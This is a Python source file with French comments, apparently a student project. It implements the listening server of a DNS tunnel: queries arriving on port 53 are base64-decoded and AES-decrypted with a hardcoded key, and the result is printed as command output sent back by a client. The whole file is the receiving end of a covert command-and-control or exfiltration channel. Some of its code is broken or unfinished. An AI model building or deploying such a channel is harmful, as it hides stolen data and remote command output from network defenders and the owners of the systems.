# dns_server.py
# Version 0.9b
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des librairies standards
from dnslib import DNSRecord, DNSHeader, QTYPE, A, RR
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# IP en réponse
IP_REPLY = '1.2.3.4'

# en écoute sur toutes les interfaces
# 0.0.0.0:53
HOST = '0.0.0.0'
PORT = 53
# clé de 32 octets pour utiliser AES-256 CBC
KEY = b'W3c9vlwl1Cj0tM6FHkh3pZ%OTc+x8ET='
# vecteur initial de 16 octets
IV = b'efd6cb512023b721'

class CustomResolver(BaseResolver):
    def resolve(self, request, handler):
        # nom de domaine à traduire
        qname = request.q.qname
        # stocke le type de requête DNS (A, AAAA, MX, TXT...)
        qtype = request.q.qtype

        # tableau vide pour stocker tous les fragments de retour
        # de subprocess
        decoded_data_list = []

        # on retire les 2 dernières données, qui représenter python.com
        # exemple avec www.myges.fr :
        # label[0] = www / label[1] = myges / label[2] = fr
        for label in qname.label[:-2]:
            # décodage de la donnée pour pouvoir la manipuler
            encoded_data = label.decode()
            try:
                # décodage + déchiffrement de la commande
                decoded_data = decrypt_aes_cbc(KEY, IV, encoded_data)
                # stockage dans le tableau
                decoded_data_list.append(decoded_data)
            
            except Exception as e:
                # Affichage sur la console de toute Exception
                print(f"Error decoding label: {e}")

        # construction de la réponse (header)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

        # pour les requêtes A (traduction d'un nom de domaine en @IP)
        if qtype == QTYPE.A:
            # renvoi de l'adresse 1.2.3.4
            reply.add_answer(RR(qname, qtype, rdata=A(IP_REPLY)))

        # retour de la réponse et du tableau décodée
        return reply, decoded_data_list

class CustomDNSHandler(DNSHandler):
    def handle(self):
        # on récupère la donnée de la requête
        data = self.request[0].strip()
        # on récupère la socket UDP
        socket = self.request[1]
        # récupère et rend les données bruts "présentable"
        request = DNSRecord.parse(data)

        # tentative de fix de l'erreur "not enough bytes"
        while request.header.qr and len(data) < len(self.request[0]):
            # ajoute des espaces pour ajouter des bits sans corrompre la données
            more_data = b' '
            data += more_data
            # représentation de la données
            request = DNSRecord.parse(data)

        # réception données du client
        reply, decoded_data_list = self.server.resolver.resolve(request, self)
        
        try:
            # on parcours l'ensemble du tableau contenant les commandes
            for command in decoded_data_list:
                # affichange du retour du client sans les break lines
                print(command, end="")
        except Exception as e:
            
            # affichage de l'expection
            print(e)

        # réponse au client
        socket.sendto(reply.pack(), self.client_address)

# chiffrement AES CBC
def encrypt_aes_cbc(key, iv, plaintext):
    # nouvelle instance AES CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # chiffrement du message
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    
    # retour du chiffré texte en base64
    return base64.b64encode(ciphertext).decode()

# déchiffrement AES CBC
def decrypt_aes_cbc(key, iv, ciphertext):
    # nouvelle instance AES CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # déchiffrement du message + décodage en base64
    decrypted_data = cipher.decrypt(base64.b64decode(ciphertext))
    
    # retour du texte en clair
    return unpad(decrypted_data, AES.block_size).decode()

"""
# fonction pour démarrer un serveur DNS
def dns_server(dns_port):
    
    # Création d'une instance
    resolver = CustomResolver()
    # Configuration de l'instance
    server = DNSServer(resolver, port=dns_port, handler=CustomResolver)

    # démarrage
    print(f"[*] Listening to {HOST}:{PORT}...")
    server.start()
"""
    
